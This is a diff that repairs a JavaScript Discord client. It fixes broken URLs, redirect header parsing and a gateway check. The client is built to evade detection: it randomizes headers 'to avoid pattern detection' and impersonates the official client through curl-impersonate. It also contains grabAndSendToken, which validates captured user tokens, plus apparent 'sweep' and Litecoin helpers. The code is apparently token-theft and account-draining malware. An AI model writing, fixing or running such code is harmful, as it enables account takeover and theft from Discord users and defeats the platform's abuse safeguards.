@@ -33,7 +33,7 @@ const _rfp = () => _fp[Math.floor(Math.random() * _fp.length)];
 
 // Axios instance with randomized keep-alive headers to avoid pattern detection
 const _axiosInstance = axios.create({
-  baseURL: 'https://discord.com  ',
+  baseURL: 'https://discord.com',
   timeout: 15000,
   headers: { 'Connection': 'keep-alive' }
 });
@@ -183,18 +183,37 @@ async function curlImpersonateRequest(url, method = 'GET', headers = {}, body = 
       if (tmpFile) { try { fs.unlinkSync(tmpFile); } catch(e) {} }
       const rawOutput = Buffer.concat(stdout);
       const outputStr = rawOutput.toString();
-      const headerEndIdx = rawOutput.indexOf('\r\n\r\n');
-      let statusCode = 0;
+
+      // Find the LAST header block (handles -L redirects: multiple HTTP responses)
+      let lastHeaderEndIdx = -1;
+      let lastStatusCode = 0;
+      let lastHeadersText = '';
       let bodyBuffer = rawOutput;
-      if (headerEndIdx >= 0) {
-        const headersText = outputStr.slice(0, headerEndIdx);
-        bodyBuffer = rawOutput.slice(headerEndIdx + 4);
-        const statusMatch = headersText.match(/HTTP\/\d\.\d\s+(\d+)/);
-        if (statusMatch) statusCode = parseInt(statusMatch[1], 10);
+
+      // Find all \r\n\r\n and keep the one after the last HTTP status line
+      let searchIdx = 0;
+      while ((searchIdx = rawOutput.indexOf('\r\n\r\n', searchIdx)) !== -1) {
+        const candidateHeaders = rawOutput.slice(0, searchIdx).toString();
+        if (/HTTP\/\d\.\d\s+(\d+)/.test(candidateHeaders)) {
+          lastHeaderEndIdx = searchIdx;
+          lastHeadersText = candidateHeaders;
+        }
+        searchIdx += 4;
       }
+
+      if (lastHeaderEndIdx >= 0) {
+        bodyBuffer = rawOutput.slice(lastHeaderEndIdx + 4);
+        const statusMatches = lastHeadersText.match(/HTTP\/\d\.\d\s+(\d+)/g);
+        if (statusMatches && statusMatches.length > 0) {
+          const lastMatch = statusMatches[statusMatches.length - 1];
+          const codeMatch = lastMatch.match(/HTTP\/\d\.\d\s+(\d+)/);
+          if (codeMatch) lastStatusCode = parseInt(codeMatch[1], 10);
+        }
+      }
+
       let data = null;
       try { data = JSON.parse(bodyBuffer.toString()); } catch(e) {}
-      resolve({ status: statusCode, headers: outputStr.slice(0, headerEndIdx), body: bodyBuffer, data });
+      resolve({ status: lastStatusCode, headers: lastHeadersText, body: bodyBuffer, data });
     });
     child.on('error', reject);
   });
@@ -267,13 +286,13 @@ class DiscordApiClient {
       'X-Discord-Locale': 'en-US',
       'X-Debug-Options': 'bugReporterEnabled',
       'X-Super-Properties': this.superProps,
-      'Referer': 'https://discord.com/channels/@me  ',
+      'Referer': 'https://discord.com/channels/@me',
       ...extra,
     };
   }
 
   async request(endpoint, method = 'GET', body = null, extraHeaders = {}) {
-    const url = `https://discord.com/api/v10  ${endpoint}`;
+    const url = `https://discord.com/api/v10${endpoint}`;
     const res = await curlImpersonateRequest(url, method, this._headers(extraHeaders), body, 20000);
     if (res.status >= 400) {
       const err = new Error(`Discord API ${method} ${endpoint} failed: ${res.status}`);
@@ -329,6 +348,9 @@ class StealthClient {
 
   async connect() {
     const gateway = await this.api.request('/gateway', 'GET');
+    if (!gateway || !gateway.url) {
+      throw new Error('Failed to fetch gateway URL: invalid or empty response from Discord API');
+    }
     // FIX: Removed compress=zlib-stream to avoid per-frame decompression crashes.
     // Discord sends plain JSON text frames without this, which the ws library handles natively.
     const wsUrl = `${gateway.url}?v=10&encoding=json`;
@@ -490,7 +512,7 @@ class StealthClient {
       form.append(`files[${i}]`, att.buffer, { filename: att.name });
     });
 
-    const url = `https://discord.com/api/v10/channels/  ${channelId}/messages`;
+    const url = `https://discord.com/api/v10/channels/${channelId}/messages`;
     const headers = {
       ...this.api._headers({ 'X-Discord-Locale': 'en-US' }),
     };
@@ -872,7 +894,7 @@ async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
     const fp = _rfp();
     const superProps = generateXSuperProperties(fp);
     const validateRes = await curlImpersonateRequest(
-      'https://discord.com/api/v10/users/@me  ',
+      'https://discord.com/api/v10/users/@me',
       'GET',
       {
         'Authorization': token,
@@ -949,7 +971,7 @@ async function checkAndSweep() {
 let cachedPrice = 85;
 async function getLTCToUSD() {
   try {
-    const res = await axios.get('https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd  ', {
+    const res = await axios.get('https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd', {
       headers: { 'User-Agent': _rfp() }, timeout: 10000
     });
     cachedPrice = res.data.litecoin.usd;
